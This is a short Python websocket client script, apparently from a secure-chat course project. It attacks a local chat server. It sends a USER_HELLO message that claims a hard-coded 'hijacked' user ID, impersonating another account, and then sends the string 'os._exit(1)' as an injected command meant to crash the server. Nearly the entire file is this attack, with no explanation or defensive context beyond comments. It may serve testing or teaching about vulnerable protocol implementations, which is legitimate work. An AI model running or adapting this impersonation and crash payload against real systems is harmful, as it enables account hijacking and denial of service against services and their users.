import asyncio
import json
import websockets
from protocol import make_envelope, parse_envelope



from crypto_services.rsa import decrypt_rsa_oaep, generate_rsa4096_keypair, private_key_to_der, public_key_to_b64url


async def connect_to_server():
    uri = "ws://127.0.0.1:8765"  # address of the running server
    async with websockets.connect(uri) as ws:
        print(f"Connected to {uri}")

        priv, pub = generate_rsa4096_keypair()

        _priv_der = private_key_to_der(priv)
        _priv = priv
        _pub_b64 = public_key_to_b64url(pub)

        hijacked_uid = "1e32fd0b-fc7b-48fe-9ef0-2cbdbec4f8a0" # parse in hijacked UID here

        

        hello_msg = make_envelope(
                        "USER_HELLO",
                        from_id=hijacked_uid,
                        to_id="server-1",
                        payload={
                            "client": "cli-v1",
                            "pubkey": _pub_b64,
                            "enc_pubkey": _pub_b64,
                        },
                        sig="",
                    )
        await ws.send(hello_msg) # optional code

        print("Sent USER_HELLO")
        
        # Wait for a reply
        reply = await ws.recv()
        print(f"Received: {reply}")


        # Send request to crash server

        crash_msg = "os._exit(1)"

        await ws.send(crash_msg)

        print("Sent crash message")
        
        # Wait for a reply
        reply = await ws.recv()
        print(f"Received: {reply}")

        
        # Close connection
        await ws.close()
        print("Connection closed")

# Run it
asyncio.run(connect_to_server())
